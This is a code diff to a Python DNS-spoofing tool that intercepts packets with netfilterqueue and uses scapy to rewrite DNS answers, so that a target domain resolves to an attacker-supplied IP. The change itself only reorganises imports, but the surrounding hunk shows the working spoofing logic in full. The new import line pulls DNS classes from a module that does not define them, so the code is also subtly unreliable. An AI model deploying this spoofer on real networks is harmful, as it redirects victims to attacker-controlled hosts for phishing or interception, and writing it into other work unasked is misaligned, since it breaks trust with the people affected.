@@ -14,6 +14,13 @@ to the redirect IP. (see: DNS Spoofing)
 import subprocess
 import netfilterqueue
 import scapy.all as scapy
+from scapy.layers.inet import IP, TCP, UDP, DNS, DNSQR, DNSRR
+# import scapy.all.IP
+# import scapy.all.TCP
+# import scapy.all.UDP
+# import scapy.all.DNS
+# import scapy.all.DNSQR
+# import scapy.all.DNSRR
 from utils.instantiate_queue import instantiate_queue
 
 class Spoofer:
@@ -30,19 +37,19 @@ class Spoofer:
         such that target_url resolves to the redirect_ip.
         """
         # wrap payload packet in Scapy IP layer
-        scapy_packet_obj = scapy.IP(packet.get_payload())
-        if (scapy_packet_obj.haslayer(scapy.DNSRR)):
-            q_name = scapy_packet_obj[scapy.DNSQR].qname
+        scapy_packet_obj = IP(packet.get_payload())
+        if (scapy_packet_obj.haslayer(DNSRR)):
+            q_name = scapy_packet_obj[DNSQR].qname
             if (self.target_url in q_name):
                 print("[+] Resolving to provided IP...")
-                manufactured_res = scapy.DNSRR(rrname=q_name,rdata=self.redirect_ip)
-                scapy_packet_obj[scapy.DNS].an = manufactured_res # supplant DNS answer
-                scapy_packet_obj[scapy.DNS].ancount = 1 # consolidate DNS answers to 1
+                manufactured_res = DNSRR(rrname=q_name,rdata=self.redirect_ip)
+                scapy_packet_obj[DNS].an = manufactured_res # supplant DNS answer
+                scapy_packet_obj[DNS].ancount = 1 # consolidate DNS answers to 1
                 # CRITICAL: scapy will autogen correct len + checksum contingent on new data
-                del scapy_packet_obj[scapy.IP].len
-                del scapy_packet_obj[scapy.IP].chksum
-                del scapy_packet_obj[scapy.UDP].len
-                del scapy_packet_obj[scapy.UDP].chksum
+                del scapy_packet_obj[IP].len
+                del scapy_packet_obj[IP].chksum
+                del scapy_packet_obj[UDP].len
+                del scapy_packet_obj[UDP].chksum
                 # distill into original packet obj 
                 packet.set_payload(str(scapy_packet_obj))
         packet.accept()
